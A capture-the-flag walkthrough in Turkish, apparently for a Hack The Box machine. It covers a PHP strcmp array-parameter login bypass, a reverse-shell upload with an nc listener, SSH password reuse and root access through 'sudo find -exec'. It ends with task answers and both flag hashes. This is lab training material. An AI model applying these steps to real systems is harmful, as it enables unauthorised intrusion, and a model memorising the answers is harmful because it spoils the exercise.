## Nmap Taraması

```
nmap -sS -A -p- -T5 10.129.186.88
```

<img width="777" height="345" alt="nmap" src="https://github.com/user-attachments/assets/943549b8-84ed-41f9-943f-09167fa35996" />


İki port açık: 22'de SSH, 80'de ise Apache üzerinde çalışan bir web sitesi. Kimlik bilgim olmadığı için önce web tarafına yöneldim.

## Web Sitesi Keşfi

Siteyi gezerken bir login sayfasına rastladım:

```
http://10.129.186.88/login/login.php
```

`/login` dizinine gittiğimde bu dosyalar gözüküyordu:

<img width="414" height="270" alt="login" src="https://github.com/user-attachments/assets/1e3317ef-d28b-483f-9580-2679a981655a" />


`.swp` uzantılı dosya hemen ilgimi çekti çünkü bu, Vim editörünün bir dosya düzenlenirken oluşturduğu geçici swap dosyası. 

Dosyayı indirdim ve `cat` ile içeriğine baktım:

```
cat 'login.php.swp'
```

İçerik biraz bozuk (binary) görünse de PHP kaynak kodunun büyük bir kısmı okunabiliyordu. Login mantığı şöyleydi:

```php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

Burada dikkatimi çeken şey `strcmp()` kullanımı oldu. PHP'de `strcmp()` fonksiyonu, karşılaştırdığı parametrelerden biri string değil de bir dizi (array) olursa hata verir ve bu hata durumunda fonksiyon `NULL` döner. PHP'de gevşek karşılaştırmada (`==`) `NULL`, `0`'a eşit kabul edilir. Yani `$_POST['username']` ve `$_POST['password']` değerlerini string yerine dizi olarak gönderirsem, `strcmp()` fonksiyonu hata verip `NULL` dönecek, bu da `0`'a eşit sayılacağı için karşılaştırma "doğru" gibi değerlendirilecekti.

## Kimlik Doğrulama Atlatma

Bunu test etmek için login isteğini Burp Suite ile yakaladım ve parametreleri dizi formatına çevirdim:

```
username[]=admin&password[]=burak
```
<img width="591" height="164" alt="upload" src="https://github.com/user-attachments/assets/b4c475ce-ccd7-47e1-9dcc-4cd0fdcc3267" />


İstek gönderildiğinde giriş başarılı oldu ve `/upload.php` sayfasına yönlendirildim. Herhangi bir gerçek kimlik bilgisi bilmeden, sadece PHP'nin bu tip karşılaştırma zafiyetini kullanarak içeri girmiş oldum.

## Dosya Yükleme ve Erişilebilir Dizin Keşfi

`/upload.php` üzerinden bir reverse shell dosyası yükledim. Ama yüklenen dosyaların hangi dizine düştüğünü bilmiyordum, dolayısıyla dosyayı tetikleyemiyordum. Bunu bulmak için ffuf ile bir dizin taraması attım:

```
ffuf -u http://10.129.186.88/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

<img width="715" height="418" alt="ffuf" src="https://github.com/user-attachments/assets/7756ad6f-8b0a-4966-b58f-7ffed0b60ec5" />


`_uploaded` isimli bir dizin doğrudan karşıma çıktı — yüklediğim dosyaların düştüğü yer buydu.

## Reverse Shell Elde Etme

Önce dinleyiciyi ayağa kaldırdım:

```
nc -lvnp 4444
```

<img width="432" height="225" alt="uploaded" src="https://github.com/user-attachments/assets/3b479d0d-dc90-444f-bd03-6648e62e8e32" />


Sonra tarayıcıdan `_uploaded/` dizinine giderek yüklediğim shell dosyasını tetikledim. Bağlantı hemen geldi:

<img width="850" height="211" alt="shell" src="https://github.com/user-attachments/assets/e24e921d-e318-49d7-b552-3325641eab06" />

`www-data` yetkisiyle bir shell elde ettim. TTY'yi daha kullanılabilir hale getirmek için:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Kimlik Bilgisi Bulma ve Yatay Hareket

Login sayfasında gördüğüm `config.php` dosyasını bu sefer shell üzerinden okudum:

```
www-data@base:/var/www/html/login$ cat config.php
```

<img width="561" height="116" alt="configphp" src="https://github.com/user-attachments/assets/fa8adb08-fb56-4898-814d-0966bd2d7f6c" />


Bu bilgiyle sisteme SSH ile erişmeyi denemeden önce, sistemde başka hangi kullanıcıların olduğuna baktım:

```
www-data@base:/$ cd home
www-data@base:/home$ ls
john
```

`john` isimli bir kullanıcı vardı, home dizininde de `user.txt` görünüyordu ama `www-data` yetkisiyle okuyamadım (Permission denied). `su admin` denedim ama sistemde böyle bir kullanıcı yoktu — bu bilgi web uygulaması içindi, sistem kullanıcısı değildi. Yine de aynı parola john için de geçerli olabilirdi diye düşünüp SSH ile denedim.

```
ssh john@10.129.186.88
```

Parola olarak `thisisagoodpassword` girildiğinde giriş başarılı oldu.

## User Flag

```
john@base:~$ cat user.txt
f54846c258f3b4612f78a819573d158e
```

<img width="271" height="66" alt="flag" src="https://github.com/user-attachments/assets/6d170838-c346-4fcd-ad2b-f8bb40cd2ccd" />


## Yetki Yükseltme

john kullanıcısının sudo yetkilerine baktım:

```
john@base:~$ sudo -l
[sudo] password for john:
Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```

`find` komutunu root olarak parolasız çalıştırma yetkim vardı. Bu, GTFOBins üzerinde çok iyi bilinen bir privilege escalation vektörü — `find` komutunun `-exec` seçeneği ile keyfi komut çalıştırılabiliyor:

```
sudo /usr/bin/find /bin -exec /bin/bash \;
```

Bu komutla root shell'i doğrudan elde ettim.

## Root Flag

```
root@base:~# cd /root
root@base:/root# cat root.txt
51709519ea18ab37dd6fc58096bea949
```

<img width="753" height="269" alt="root" src="https://github.com/user-attachments/assets/60f6c947-e0be-4c6e-a9d1-74e1dfaba127" />

## Görev Soruları ve Cevapları

**Görev 1 — Uzak sunucuda hangi iki TCP portu açık?**
`22,80`

**Görev 2 — Giriş sayfası için web sunucusundaki göreceli yol nedir?**
`/login/login.php`

**Görev 3 — '/login' dizininde kaç dosya bulunmaktadır?**
`3`

**Görev 4 — Takas dosyasının dosya uzantısı nedir?**
`.swp`

**Görev 5 — Arka uç kodunda, kullanıcının gönderdiği kullanıcı adı ve şifreyi geçerli kullanıcı adı ve şifreyle karşılaştırmak için hangi PHP fonksiyonu kullanılıyor?**
`strcmp()`

**Task 6 — In which directory are the uploaded files stored?**
`_uploaded`

**Task 7 — Which user exists on the remote host with a home directory?**
`john`

**Task 8 — What is the password for the user present on the system?**
`thisisagoodpassword`

**Submit User Flag — Submit the flag located in the john user's home directory.**
`f54846c258f3b4612f78a819573d158e`

**Task 10 — What is the full path to the command that the user john can run as user root on the remote host?**
`/usr/bin/find`

**Task 11 — What action can the find command use to execute commands?**
`exec`

**Kök Bayrağı Gönder — Submit the flag located on the administrator's desktop.**
`51709519ea18ab37dd6fc58096bea949`
